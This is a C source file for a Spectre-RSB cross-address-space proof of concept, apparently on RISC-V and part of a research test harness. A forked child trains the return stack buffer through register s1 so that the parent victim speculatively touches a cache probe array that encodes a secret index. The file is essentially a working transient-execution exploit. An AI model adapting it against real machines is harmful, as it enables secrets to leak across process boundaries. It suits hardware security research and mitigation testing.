#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// RSB ca-ip: cross-address in-place via fork, shared RSB hardware
//
// Key: use callee-saved register s1 for target address.
// Child (attacker) sets s1=TRAIN, parent (victim) sets s1=SECRET.
// Only child has maccess. Speculatively, parent returns to child's maccess.

#define TRAIN_VALUE 0x01

uint8_t* probe_array;
static int is_attacker = 0;

void __attribute__((noinline)) in_place() {
    if (is_attacker) {
        usleep(20);
    } else {
        usleep(800);
    }
    return;
}

void rsb_ca_ip_setup(exploit_ctx_t* ctx, void* data) {
    ctx->exclude_enabled = true;
    ctx->exclude_value = TRAIN_VALUE;
}

void rsb_ca_ip_child_loop(exploit_ctx_t* ctx, void* data) {
    is_attacker = 1;
    void* train_target = probe_array + TRAIN_VALUE * PAGE_SIZE;
    asm volatile("mv s1, %0" : : "r"(train_target) : "s1");
    in_place();
    void* target;
    asm volatile("mv %0, s1" : "=r"(target));
    SPEC_FENCE();
    maccess(target);
}

void rsb_ca_ip_parent_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    void* secret_target = probe_array + encode_index * PAGE_SIZE;
    asm volatile("mv s1, %0" : : "r"(secret_target) : "s1");
    sched_yield();
    in_place();
}

int main() {
    exploit_ctx_t ctx = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-RSB ca-ip\n");

    exploit_hooks_t hooks = {
        .setup = rsb_ca_ip_setup,
        .cleanup = NULL,
        .attack = NULL,
        .attacker_thread = NULL,
        .victim_thread = NULL,
        .pre_measure = NULL,
        .child_loop = rsb_ca_ip_child_loop,
        .parent_attack = rsb_ca_ip_parent_attack
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("RSB cross-address in-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
